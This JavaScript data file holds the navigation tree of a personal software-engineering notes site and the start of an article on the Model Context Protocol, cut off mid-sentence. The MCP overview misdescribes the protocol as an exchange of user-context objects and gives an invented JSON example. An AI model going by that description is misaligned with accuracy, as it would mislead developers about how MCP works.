// Auto-generated by generate_data.py — do not edit manually
const LEARNINGS = {
  "navTree": [
    {
      "key": "ai",
      "title": "Artificial Intelligence",
      "id": "ai",
      "is_leaf": false,
      "depth": 0,
      "children": [
        {
          "key": "agents",
          "title": "Agents",
          "id": "ai/agents",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "mcp-protocol",
              "title": "MCP Protocol",
              "id": "ai/agents/mcp-protocol",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "mcp-intro",
                  "title": "Model Context Protocol (MCP): An Overview",
                  "id": "ai/agents/mcp-protocol/mcp-intro",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            }
          ]
        },
        {
          "key": "applications",
          "title": "Applications",
          "id": "ai/applications",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "cursor",
              "title": "Cursor",
              "id": "ai/applications/cursor",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "cursor-skills",
                  "title": "Cursor IDE Skills: Complete Overview",
                  "id": "ai/applications/cursor/cursor-skills",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            }
          ]
        },
        {
          "key": "misc",
          "title": "Miscellaneous",
          "id": "ai/misc",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "mime-type-issues",
              "title": "Mime Type Issues",
              "id": "ai/misc/mime-type-issues",
              "is_leaf": true,
              "depth": 2
            }
          ]
        }
      ]
    },
    {
      "key": "misc",
      "title": "Miscellaneous",
      "id": "misc",
      "is_leaf": false,
      "depth": 0,
      "children": [
        {
          "key": "cname",
          "title": "CNAME Records: A Concise Overview",
          "id": "misc/cname",
          "is_leaf": true,
          "depth": 1
        },
        {
          "key": "dns",
          "title": "How DNS Works: A Concise Overview",
          "id": "misc/dns",
          "is_leaf": true,
          "depth": 1
        },
        {
          "key": "email-smtp",
          "title": "MX Records and SMTP Relay Rules: A Concise Overview",
          "id": "misc/email-smtp",
          "is_leaf": true,
          "depth": 1
        },
        {
          "key": "logical-fallacies",
          "title": "Logical Fallacies: Complete Overview",
          "id": "misc/logical-fallacies",
          "is_leaf": true,
          "depth": 1
        },
        {
          "key": "mime-type-issues",
          "title": "Mime Type Issues",
          "id": "misc/mime-type-issues",
          "is_leaf": true,
          "depth": 1
        },
        {
          "key": "productivity",
          "title": "Productivity",
          "id": "misc/productivity",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "atomic-habits",
              "title": "Atomic Habits: Habit Formation Guide",
              "id": "misc/productivity/atomic-habits",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "vocab",
          "title": "Vocab",
          "id": "misc/vocab",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "determanistic-vs-probabalistic",
              "title": "Deterministic vs Probabilistic Systems: Complete Overview",
              "id": "misc/vocab/determanistic-vs-probabalistic",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "web",
          "title": "Web",
          "id": "misc/web",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "web-metrics",
              "title": "Web Performance Metrics: Complete Overview",
              "id": "misc/web/web-metrics",
              "is_leaf": true,
              "depth": 2
            }
          ]
        }
      ]
    },
    {
      "key": "swe",
      "title": "Software Engineering",
      "id": "swe",
      "is_leaf": false,
      "depth": 0,
      "children": [
        {
          "key": "aws-cloud",
          "title": "AWS Cloud",
          "id": "swe/aws-cloud",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "aws-api-gateway",
              "title": "AWS API Gateway: Your Cloud's Front Door",
              "id": "swe/aws-cloud/aws-api-gateway",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-cloud-formation",
              "title": "AWS CloudFormation: Complete Overview",
              "id": "swe/aws-cloud/aws-cloud-formation",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-cloudtrail",
              "title": "AWS CloudTrail: Complete Overview",
              "id": "swe/aws-cloud/aws-cloudtrail",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-disaster-recovery",
              "title": "AWS Disaster Recovery: A Well-Structured Overview",
              "id": "swe/aws-cloud/aws-disaster-recovery",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-fundemental-services",
              "title": "Basic Most Popular AWS Services: A Well-Structured Overview",
              "id": "swe/aws-cloud/aws-fundemental-services",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-lambda-file-structure",
              "title": "AWS Lambda API Endpoint: Typical File Structure",
              "id": "swe/aws-cloud/aws-lambda-file-structure",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-lambda-vs-lambda-handler",
              "title": "Lambda Configuration (AWS Console or Infrastructure as Code)",
              "id": "swe/aws-cloud/aws-lambda-vs-lambda-handler",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-lambdas",
              "title": "AWS Lambda: A Well-Structured Overview",
              "id": "swe/aws-cloud/aws-lambdas",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-s3",
              "title": "AWS S3 (Simple Storage Service): A Well-Structured Overview",
              "id": "swe/aws-cloud/aws-s3",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "aws-vpc",
              "title": "AWS VPC (Virtual Private Cloud): Complete Overview",
              "id": "swe/aws-cloud/aws-vpc",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "cloud-pipelines-aws",
              "title": "AWS CloudPipelines: A Well-Structured Overview",
              "id": "swe/aws-cloud/cloud-pipelines-aws",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "backend",
          "title": "Backend",
          "id": "swe/backend",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "api",
              "title": "Api",
              "id": "swe/backend/api",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "openapi",
                  "title": "OpenAPI Specification: Complete Overview",
                  "id": "swe/backend/api/openapi",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "url-parameter-types",
                  "title": "URL Parameter Types: Complete Overview",
                  "id": "swe/backend/api/url-parameter-types",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "databases",
              "title": "Databases",
              "id": "swe/backend/databases",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "db_indexing",
                  "title": "Database Indexing: A Well-Structured Overview",
                  "id": "swe/backend/databases/db_indexing",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "drizzle",
                  "title": "Drizzle ORM",
                  "id": "swe/backend/databases/drizzle",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "drizzle-intro",
                      "title": "Drizzle ORM: A Well-Structured Overview",
                      "id": "swe/backend/databases/drizzle/drizzle-intro",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "drizzle-one-to-one",
                      "title": "Drizzle ORM One-to-One Relationships: Complete Overview",
                      "id": "swe/backend/databases/drizzle/drizzle-one-to-one",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "migrations",
                  "title": "Database Migrations: A Well-Structured Overview",
                  "id": "swe/backend/databases/migrations",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "soft-delete-db",
                  "title": "Soft Deletes in Databases: A Well-Structured Overview",
                  "id": "swe/backend/databases/soft-delete-db",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "sql",
                  "title": "SQL",
                  "id": "swe/backend/databases/sql",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "identity-sql",
                      "title": "SQL IDENTITY(1,1): Complete Overview",
                      "id": "swe/backend/databases/sql/identity-sql",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "like-ilike-sql",
                      "title": "SQL LIKE vs ILIKE and Collation: Complete Overview",
                      "id": "swe/backend/databases/sql/like-ilike-sql",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "postgreSQL",
                      "title": "PostgreSQL: Strengths and Weaknesses",
                      "id": "swe/backend/databases/sql/postgreSQL",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "psql",
                      "title": "psql: A Well-Structured Overview",
                      "id": "swe/backend/databases/sql/psql",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "sql-basics",
                      "title": "SQL Basics: A Well-Structured Overview",
                      "id": "swe/backend/databases/sql/sql-basics",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "sql-triggers",
                  "title": "SQL Triggers: A Well-Structured Overview",
                  "id": "swe/backend/databases/sql-triggers",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            }
          ]
        },
        {
          "key": "business-value",
          "title": "Business Value",
          "id": "swe/business-value",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "product-swe",
              "title": "Product and Software Engineering Relationship: Complete Overview",
              "id": "swe/business-value/product-swe",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "data_structures_algos",
          "title": "Data Structures & Algorithms",
          "id": "swe/data_structures_algos",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "graph_data_structures",
              "title": "Graph Data Structures in JavaScript",
              "id": "swe/data_structures_algos/graph_data_structures",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "design-patterns",
          "title": "Design Patterns",
          "id": "swe/design-patterns",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "factory-design-pattern",
              "title": "Factory Design Pattern: Complete Overview",
              "id": "swe/design-patterns/factory-design-pattern",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "devops",
          "title": "DevOps",
          "id": "swe/devops",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "shell",
              "title": "Shell",
              "id": "swe/devops/shell",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "npx",
                  "title": "npx: Complete Overview",
                  "id": "swe/devops/shell/npx",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            }
          ]
        },
        {
          "key": "frontend",
          "title": "Frontend",
          "id": "swe/frontend",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "browser-stuff",
              "title": "Browser Stuff",
              "id": "swe/frontend/browser-stuff",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "query-params",
                  "title": "URL Query Parameters: Complete Overview",
                  "id": "swe/frontend/browser-stuff/query-params",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "http",
              "title": "Http",
              "id": "swe/frontend/http",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "axios",
                  "title": "Axios: Complete Overview",
                  "id": "swe/frontend/http/axios",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "headers-http",
                  "title": "HTTP Request Headers: Complete Overview",
                  "id": "swe/frontend/http/headers-http",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "misc",
              "title": "Miscellaneous",
              "id": "swe/frontend/misc",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "package.json",
                  "title": "package.json and package-lock.json: A Concise Overview",
                  "id": "swe/frontend/misc/package.json",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "react",
              "title": "React",
              "id": "swe/frontend/react",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "components",
                  "title": "Components",
                  "id": "swe/frontend/react/components",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "select-dropdown-react",
                      "title": "Designing a Dropdown Component in React with MUI: A Well-Structured Overview",
                      "id": "swe/frontend/react/components/select-dropdown-react",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "event-handling",
                  "title": "Event Handling and Interaction Precedence in UI Component Libraries",
                  "id": "swe/frontend/react/event-handling",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "hooks",
                  "title": "Hooks",
                  "id": "swe/frontend/react/hooks",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "use-callback-hook",
                      "title": "React useCallback Hook: Complete Overview",
                      "id": "swe/frontend/react/hooks/use-callback-hook",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "use-memo-hook",
                      "title": "React useMemo Hook: Complete Overview",
                      "id": "swe/frontend/react/hooks/use-memo-hook",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "useEffect-dependency-list",
                      "title": "React useEffect Dependency List: A Well-Structured Overview",
                      "id": "swe/frontend/react/hooks/useEffect-dependency-list",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "react-routing",
                  "title": "React Routing: A Well-Structured Overview",
                  "id": "swe/frontend/react/react-routing",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "redux",
                  "title": "Redux",
                  "id": "swe/frontend/react/redux",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "redux-dispatch",
                      "title": "React Redux Toolkit dispatch(): Complete Overview",
                      "id": "swe/frontend/react/redux/redux-dispatch",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "redux-intro",
                      "title": "React Redux: A Concise Overview",
                      "id": "swe/frontend/react/redux/redux-intro",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "redux-reducers-extra-reducers",
                      "title": "Redux Toolkit Reducers vs Extra Reducers: Complete Overview",
                      "id": "swe/frontend/react/redux/redux-reducers-extra-reducers",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "redux-slice",
                      "title": "React Redux Slices: A Concise Overview",
                      "id": "swe/frontend/react/redux/redux-slice",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "routes",
                  "title": "Routes",
                  "id": "swe/frontend/react/routes",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "react-router-intro",
                      "title": "React Router: A Well-Structured Overview",
                      "id": "swe/frontend/react/routes/react-router-intro",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "types",
                  "title": "Types",
                  "id": "swe/frontend/react/types",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "PropsWithChildren-react",
                      "title": "React PropsWithChildren: Complete Overview",
                      "id": "swe/frontend/react/types/PropsWithChildren-react",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                }
              ]
            },
            {
              "key": "testing",
              "title": "Testing",
              "id": "swe/frontend/testing",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "data-testid-cypress",
                  "title": "Cypress Testing with data-testid: Complete Overview",
                  "id": "swe/frontend/testing/data-testid-cypress",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "jest-expect-matchers",
                  "title": "Jest Expect Matchers: A Well-Structured Overview",
                  "id": "swe/frontend/testing/jest-expect-matchers",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            }
          ]
        },
        {
          "key": "languages",
          "title": "Languages",
          "id": "swe/languages",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "javascript",
              "title": "JavaScript",
              "id": "swe/languages/javascript",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "equality-comparisons-sameness",
                  "title": "Equality Comparisons and Sameness in JavaScript",
                  "id": "swe/languages/javascript/equality-comparisons-sameness",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "generics",
                  "title": "Generics",
                  "id": "swe/languages/javascript/generics",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "generics-constraints",
                      "title": "TypeScript Generics with Constraints (`extends`): A Well-Structured Overview",
                      "id": "swe/languages/javascript/generics/generics-constraints",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "generics_learn",
                      "title": "TypeScript Generics — A Pragmatic README",
                      "id": "swe/languages/javascript/generics/generics_learn",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "hoisting-js",
                  "title": "JavaScript Hoisting: Complete Overview",
                  "id": "swe/languages/javascript/hoisting-js",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "map-filter-reduce",
                  "title": "Map / Filter / Reduce",
                  "id": "swe/languages/javascript/map-filter-reduce",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "filter-method-js-overview",
                      "title": "JavaScript Array.filter(): A Well-Structured Overview",
                      "id": "swe/languages/javascript/map-filter-reduce/filter-method-js-overview",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "map-filter-reduce-intro",
                      "title": "JavaScript `map`, `filter`, and `reduce`: A Practical Overview",
                      "id": "swe/languages/javascript/map-filter-reduce/map-filter-reduce-intro",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "pass-by-value-reference-js",
                  "title": "Passing by Value vs Passing by Reference in JavaScript: A Well-Structured Overview",
                  "id": "swe/languages/javascript/pass-by-value-reference-js",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "sort",
                  "title": "Sort",
                  "id": "swe/languages/javascript/sort",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "localcompare-js-sort",
                      "title": "JavaScript Sorting with localeCompare",
                      "id": "swe/languages/javascript/sort/localcompare-js-sort",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "sort-js",
                      "title": "Sort Js",
                      "id": "swe/languages/javascript/sort/sort-js",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "sort-js-method",
                      "title": "JavaScript Array.sort(): Complete Overview",
                      "id": "swe/languages/javascript/sort/sort-js-method",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "testing",
                  "title": "Testing",
                  "id": "swe/languages/javascript/testing",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "test-mocking-basics",
                      "title": "Fundamental Jest Unit Testing Principles: Mocking",
                      "id": "swe/languages/javascript/testing/test-mocking-basics",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "test-mocking-intermediate",
                      "title": "Intermediate Jest Unit Testing: Advanced Mocking Concepts",
                      "id": "swe/languages/javascript/testing/test-mocking-intermediate",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                },
                {
                  "key": "truthy-falsey",
                  "title": "Truthy and Falsy Values in JavaScript: A Well-Structured Overview",
                  "id": "swe/languages/javascript/truthy-falsey",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "tsoa",
                  "title": "TSOA: Complete Overview",
                  "id": "swe/languages/javascript/tsoa",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "typing",
                  "title": "Typing",
                  "id": "swe/languages/javascript/typing",
                  "is_leaf": false,
                  "depth": 3,
                  "children": [
                    {
                      "key": "conditional-typing",
                      "title": "TypeScript Conditional Typing: An Introduction",
                      "id": "swe/languages/javascript/typing/conditional-typing",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "function-signature-typing-ts",
                      "title": "TypeScript Function Signatures: Complete Overview",
                      "id": "swe/languages/javascript/typing/function-signature-typing-ts",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "interface-vs-typing",
                      "title": "TypeScript Types vs Interfaces: Complete Overview",
                      "id": "swe/languages/javascript/typing/interface-vs-typing",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "type-casting",
                      "title": "TypeScript Type Casting: Complete Overview",
                      "id": "swe/languages/javascript/typing/type-casting",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "type-predicates",
                      "title": "TypeScript Type Predicates: Complete Overview",
                      "id": "swe/languages/javascript/typing/type-predicates",
                      "is_leaf": true,
                      "depth": 4
                    },
                    {
                      "key": "typescript-inheritance",
                      "title": "TypeScript Inheritance: Complete Overview",
                      "id": "swe/languages/javascript/typing/typescript-inheritance",
                      "is_leaf": true,
                      "depth": 4
                    }
                  ]
                }
              ]
            }
          ]
        },
        {
          "key": "misc",
          "title": "Miscellaneous",
          "id": "swe/misc",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "autheNtication",
              "title": "Authentication",
              "id": "swe/misc/autheNtication",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "jwt",
                  "title": "Jwt",
                  "id": "swe/misc/autheNtication/jwt",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "barrel-files",
              "title": "Barrel Files: Complete Overview",
              "id": "swe/misc/barrel-files",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "code-complexity",
              "title": "Code Complexity: Complete Overview",
              "id": "swe/misc/code-complexity",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "compile-vs-runtime",
              "title": "Compile Time vs Runtime: Complete Guide",
              "id": "swe/misc/compile-vs-runtime",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "curry-functions",
              "title": "Currying Functions: Complete Overview",
              "id": "swe/misc/curry-functions",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "error-handling",
              "title": "Error Handling",
              "id": "swe/misc/error-handling",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "error-logging-standards",
                  "title": "Error Logging Standards: A Concise Overview",
                  "id": "swe/misc/error-handling/error-logging-standards",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "error-logs-itermediate",
                  "title": "Reading Error Logs: Complete Overview",
                  "id": "swe/misc/error-handling/error-logs-itermediate",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "git",
              "title": "Git",
              "id": "swe/misc/git",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "git-exclude-vs-skip-worktree",
                  "title": "Git .git/info/exclude vs skip-worktree: Complete Overview",
                  "id": "swe/misc/git/git-exclude-vs-skip-worktree",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "git-reflog",
                  "title": "Git Reflog: Complete Overview",
                  "id": "swe/misc/git/git-reflog",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "git-stash",
                  "title": "Git Stash: A Well-Structured Overview",
                  "id": "swe/misc/git/git-stash",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "json",
              "title": "JSON (JavaScript Object Notation): Complete Overview",
              "id": "swe/misc/json",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "libraries",
              "title": "Libraries",
              "id": "swe/misc/libraries",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "eslint",
                  "title": "ESLint: Complete Overview",
                  "id": "swe/misc/libraries/eslint",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "libs-vs-apps",
              "title": "Shared Libraries vs Applications in Large Monorepos",
              "id": "swe/misc/libs-vs-apps",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "logging",
              "title": "Logging",
              "id": "swe/misc/logging",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "profile-start-end",
                  "title": "Logger: `profileStart` and `profileEnd` Methods",
                  "id": "swe/misc/logging/profile-start-end",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "stdin-stdout",
                  "title": "Standard Input (stdin) and Standard Output (stdout): A Concise Overview",
                  "id": "swe/misc/logging/stdin-stdout",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "magic-strings-enums-constants",
              "title": "Magic Strings, Enums, and Constants: Complete Overview",
              "id": "swe/misc/magic-strings-enums-constants",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "mime-type-issues",
              "title": "MIME Type Issues",
              "id": "swe/misc/mime-type-issues",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "package-managers",
              "title": "Package Managers",
              "id": "swe/misc/package-managers",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "npm-dependency-tree",
                  "title": "NPM Dependency Trees: Complete Overview",
                  "id": "swe/misc/package-managers/npm-dependency-tree",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "regex",
              "title": "Popular Regex Expressions: A Well-Structured Overview",
              "id": "swe/misc/regex",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "sev1-sev2",
              "title": "SEV1/SEV2 Incidents: A Well-Structured Overview",
              "id": "swe/misc/sev1-sev2",
              "is_leaf": true,
              "depth": 2
            },
            {
              "key": "shell",
              "title": "Shell",
              "id": "swe/misc/shell",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "stdin-stdout",
                  "title": "Standard Input (stdin) and Standard Output (stdout): A Concise Overview",
                  "id": "swe/misc/shell/stdin-stdout",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "terminal-vs-shell",
                  "title": "Terminal vs Shell: A Concise Overview",
                  "id": "swe/misc/shell/terminal-vs-shell",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "verisons-zsh",
                  "title": "Finding Software Versions in ZSH: Complete Overview",
                  "id": "swe/misc/shell/verisons-zsh",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "time-space-complexity",
              "title": "Time & Space Complexity",
              "id": "swe/misc/time-space-complexity",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "big-0-notation",
                  "title": "Big O Notation: A Well-Structured Overview",
                  "id": "swe/misc/time-space-complexity/big-0-notation",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "space-complexity",
                  "title": "Space Complexity in Algorithms: A Detailed Overview",
                  "id": "swe/misc/time-space-complexity/space-complexity",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "time-complexity",
                  "title": "Time Complexity for Algorithms: A Detailed Overview",
                  "id": "swe/misc/time-space-complexity/time-complexity",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            },
            {
              "key": "tree-shacking",
              "title": "Tree-Shaking and `sideEffects` in Modern JavaScript Projects",
              "id": "swe/misc/tree-shacking",
              "is_leaf": true,
              "depth": 2
            }
          ]
        },
        {
          "key": "security",
          "title": "Security",
          "id": "swe/security",
          "is_leaf": false,
          "depth": 1,
          "children": [
            {
              "key": "web-security",
              "title": "Web Security",
              "id": "swe/security/web-security",
              "is_leaf": false,
              "depth": 2,
              "children": [
                {
                  "key": "cloudflare-intro",
                  "title": "Cloudflare: Complete Overview",
                  "id": "swe/security/web-security/cloudflare-intro",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "cloudflare-wordpress",
                  "title": "Summary",
                  "id": "swe/security/web-security/cloudflare-wordpress",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "cve",
                  "title": "CVE (Common Vulnerabilities and Exposures): Complete Overview",
                  "id": "swe/security/web-security/cve",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "ddos",
                  "title": "DoS and DDoS Attacks: Complete Overview",
                  "id": "swe/security/web-security/ddos",
                  "is_leaf": true,
                  "depth": 3
                },
                {
                  "key": "ssl",
                  "title": "SSL/TLS Certificates: Complete Overview",
                  "id": "swe/security/web-security/ssl",
                  "is_leaf": true,
                  "depth": 3
                }
              ]
            }
          ]
        }
      ]
    }
  ],
  "articles": [
    {
      "id": "ai/agents/mcp-protocol/mcp-intro",
      "title": "Model Context Protocol (MCP): An Overview",
      "path": [
        "ai",
        "agents",
        "mcp-protocol",
        "mcp-intro"
      ],
      "content": "# Model Context Protocol (MCP): An Overview\n\nThe Model Context Protocol (MCP) is an open standard designed to enable AI models, tools, and applications to communicate context and state in a structured, interoperable way. \n\nMCP aims to make it easier for different AI systems to work together, share information, and maintain continuity across interactions.\n\n## Key Points\n\n- **Interoperability:** MCP provides a common format for exchanging context between models, tools, and applications.\n- **Extensibility:** The protocol is designed to be flexible, supporting custom fields and future extensions.\n- **Structured Context:** Context is represented as structured data (typically JSON), making it easy to parse and use programmatically.\n- **Continuity:** Enables persistent context across sessions, improving user experience and model performance.\n- **Open Standard:** MCP is openly documented and intended for broad adoption in the AI ecosystem.\n\n## Step-by-Step Explanation\n\n1. **Context Creation**\n   - An application or tool creates a context object containing relevant information (e.g., user preferences, conversation history).\n   ```json\n   {\n     \"version\": \"1.0\",\n     \"user\": { \"id\": \"123\", \"preferences\": { \"theme\": \"dark\" } },\n     \"history\": [ { \"role\": \"user\", \"content\": \"Hello!\" } ]\n   }\n   ```\n\n2. **Context Exchange**\n   - The context object is sent to an AI model or another tool using the MCP format.\n\n3. **Context Update**\n   - As the conversation or session progresses, the context object is updated and passed along to maintain continuity.\n\n4. **Context Consumption**\n   - Models and tools read the context to personalize responses, maintain state, or coordinate actions.\n\n## Common Pitfalls\n\n- **Version Mismatches:** Ensure all parties use compatible MCP versions.\n- **Incomplete Context:** Missing or outdated context can lead to degraded performance or user experience.\n- **Overly Large Contexts:** Passing excessive data can impact performance and increase latency.\n\n## Practical Applications\n\n- Multi-agent AI systems sharing user state and preferences.\n- Persistent chatbots that remember conversation history.\n- Integrating third-party tools with AI models for richer, context-aware interactions.\n\n## Examples of Helpful MCP Servers\n\nWhile MCP is a relatively new protocol, several types of servers and systems can benefit from implementing MCP, and some early projects and open-source tools are emerging:\n\n- **AI Orchestration Servers:**  \n  Servers that coordinate multiple AI models or agents (e.g., routing user queries to the best model, aggregating responses, or managing conversation state) can use MCP to maintain and share context across components.\n\n- **Conversational AI Platforms:**  \n  Chatbot frameworks or virtual assistant backends that need to persist user context, preferences, and conversation history across sessions and tools.\n\n- **Tool-Integrated AI Agents:**  \n  Servers that connect AI models with 